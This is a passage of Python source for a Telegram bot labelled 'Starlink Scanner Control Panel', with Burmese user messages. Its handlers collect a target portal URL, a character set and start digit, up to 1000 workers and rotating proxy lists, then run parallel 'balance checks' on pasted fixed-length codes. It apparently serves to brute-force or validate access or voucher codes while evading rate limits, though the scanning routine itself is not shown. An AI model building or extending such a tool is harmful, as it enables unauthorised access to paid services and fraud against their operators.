            await update.message.reply_text("❌ ကျေးဇူးပြု၍ ညာဘက် http/https URL ပို့ပါ။")
            return
        ud['portal_url'] = text
        ud['state'] = None
        try:
            with open(f"{PORTAL_URL_PATH}{user_id}.txt", "w") as f:
                f.write(text)
        except Exception:
            pass
        pm = get_proxy_manager()
        proxy_total, proxy_active = pm.stats()
        msg = await update.message.reply_text(
            f"✅ Portal URL ကို အောင်မြင်စွာ သိမ်းဆည်းပြီးပါပြီ။\n\n"
            f"⚡ **Starlink Scanner Control Panel** ⚡\n\n"
            f"⚙️ Current Mode: `{ud['mode']}`\n"
            f"🔀 Proxies: `{proxy_active}/{proxy_total}`\n"
            f"👷 Workers: `{ud['num_workers']}`",
            reply_markup=get_main_menu_markup(),
            parse_mode=ParseMode.MARKDOWN
        )
        ud['menu_msg_id'] = msg.message_id

    elif state == 'waiting_for_digit':
        if text in ud['char_set'] and len(text) == 1:
            ud['start_digit'] = text
        else:
            ud['start_digit'] = '0'
        ud['state'] = None
        pm = get_proxy_manager()
        proxy_total, proxy_active = pm.stats()
        msg = await update.message.reply_text(
            f"✅ Custom Start Digit = `{ud['start_digit']}` သတ်မှတ်ပြီးပါပြီ။\n\n"
            f"⚡ **Starlink Scanner Control Panel** ⚡\n\n"
            f"⚙️ Current Mode: `{ud['mode']}`\n"
            f"🔀 Proxies: `{proxy_active}/{proxy_total}`\n"
            f"👷 Workers: `{ud['num_workers']}`",
            reply_markup=get_main_menu_markup(),
            parse_mode=ParseMode.MARKDOWN
        )
        ud['menu_msg_id'] = msg.message_id

    elif state == 'waiting_for_workers':
        try:
            n = int(text)
            if 1 <= n <= 1000:
                ud['num_workers'] = n
                ud['state'] = None
                pm = get_proxy_manager()
                proxy_total, proxy_active = pm.stats()
                msg = await update.message.reply_text(
                    f"✅ Workers set to `{n}`\n\n"
                    f"⚡ **Starlink Scanner Control Panel** ⚡\n\n"
                    f"⚙️ Current Mode: `{ud['mode']}`\n"
                    f"🔀 Proxies: `{proxy_active}/{proxy_total}`\n"
                    f"👷 Workers: `{n}`",
                    reply_markup=get_main_menu_markup(),
                    parse_mode=ParseMode.MARKDOWN
                )
                ud['menu_msg_id'] = msg.message_id
            else:
                await update.message.reply_text("❌ 1 မှ 1000 အတွင်း ထည့်ပါ။")
        except ValueError:
            await update.message.reply_text("❌ ဂဏန်းသာ ထည့်ပါ။")

    elif state == 'waiting_for_proxy_url':
        if not text.startswith("http"):
            await update.message.reply_text("❌ ကျေးဇူးပြု၍ http/https URL ပို့ပါ။")
            return
        ud['state'] = None
        await update.message.reply_text("⏳ Manual URL မှ proxy များကို စစ်ဆေးနေပါသည်...")
        pc = user_proxy_checks.get(user_id)
        if pc and pc.get('task') and not pc['task'].done():
            await update.message.reply_text("⚠️ Proxy check ပြေးနေပြီးသားဖြစ်ပါသည်။")
            return
        asyncio.create_task(run_proxy_check(context, update.message.chat_id, user_id, sources=[text]))

    elif state == 'waiting_for_proxy_text':
        lines = [line.strip() for line in text.splitlines() if line.strip()]
        if not lines:
            await update.message.reply_text("❌ Proxy list ဗလာဖြစ်နေပါသည်။ ထပ်မံကြိုးစားပါ။")
            return
        try:
            pm = get_proxy_manager()
            added = pm.add_proxies(lines)
            total, active = pm.stats()
            ud['state'] = None
            msg = await update.message.reply_text(
                f"✅ **Proxies အောင်မြင်စွာ သိမ်းဆည်းပြီးပါပြီ**\n"
                f"📊 Added: `{added}`\n"
                f"📊 Total: `{total}`\n"
                f"✅ Active: `{active}`\n\n"
                f"⚡ **Starlink Scanner Control Panel** ⚡\n\n"
                f"⚙️ Current Mode: `{ud['mode']}`\n"
                f"🔀 Proxies: `{active}/{total}`\n"
                f"👷 Workers: `{ud['num_workers']}`",
                reply_markup=get_main_menu_markup(),
                parse_mode=ParseMode.MARKDOWN
            )
            ud['menu_msg_id'] = msg.message_id
        except Exception as e:
            await update.message.reply_text(f"❌ Proxy ဖိုင်ရေးရာတွင် အမှားအယွင်းရှိ: {e}")

    elif state == 'waiting_for_manual_codes':
        st = get_manual_balance_state(user_id)
        expected_len = st['code_len']
        codes = split_codes(text, expected_len=expected_len)
        raw_all = split_codes(text, expected_len=None)
        skipped = len(raw_all) - len(codes)
        if not codes:
            await update.message.reply_text(
                f"❌ Mode `{st['mode']}` ({expected_len} digit) နဲ့ ကိုက်တာ မရှိပါ။\n"
                f"Raw codes: {len(raw_all)} ခုရှိပေမယ့် length {expected_len} မကိုက်ပါ။",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        st['codes'] = codes
        ud['state'] = None
        await update.message.reply_text(
            f"✅ Codes လက်ခံပြီးပါပြီ\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"⚙️ Mode     : `{st['mode']}` ({expected_len} digit)\n"
            f"📋 Valid    : {len(codes)}\n"
            f"⏭ Skipped  : {skipped}\n"
            f"⚡ Parallel : {MANUAL_CONCURRENCY}\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"⏳ Auto check စတင်ပါပြီ (FAST)...",
            parse_mode=ParseMode.MARKDOWN
        )
        st['task'] = asyncio.create_task(
            run_manual_balance_check(context, update.message.chat_id, user_id)
        )


# ---------------- MAIN ----------------
def main():
    check_approval()
    start_web_server()
    bot_token = get_bot_token()
    pm = get_proxy_manager()
    total, active = pm.stats()
    print(f"[MAIN] Bot ready. Session active.")
    print(f"[MAIN] Proxy Manager initialized: {active}/{total} active proxies")
    app = Application.builder().token(bot_token).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop_cmd))
    app.add_handler(CommandHandler("addproxies", add_proxies_cmd))
    app.add_handler(CallbackQueryHandler(handle_callbacks))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    print("Bot is running with python-telegram-bot...")
    print("Thank for using By Telegram@khzisme")
    app.run_polling()


if __name__ != "__main__":
    try:
        main()
    except (KeyboardInterrupt, SystemExit):
        pass

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Cancelled.")
    except SystemExit:
        pass
    except Exception as e:
        print(f"\n[FATAL] {type(e).__name__}: {e}")
        traceback.print_exc()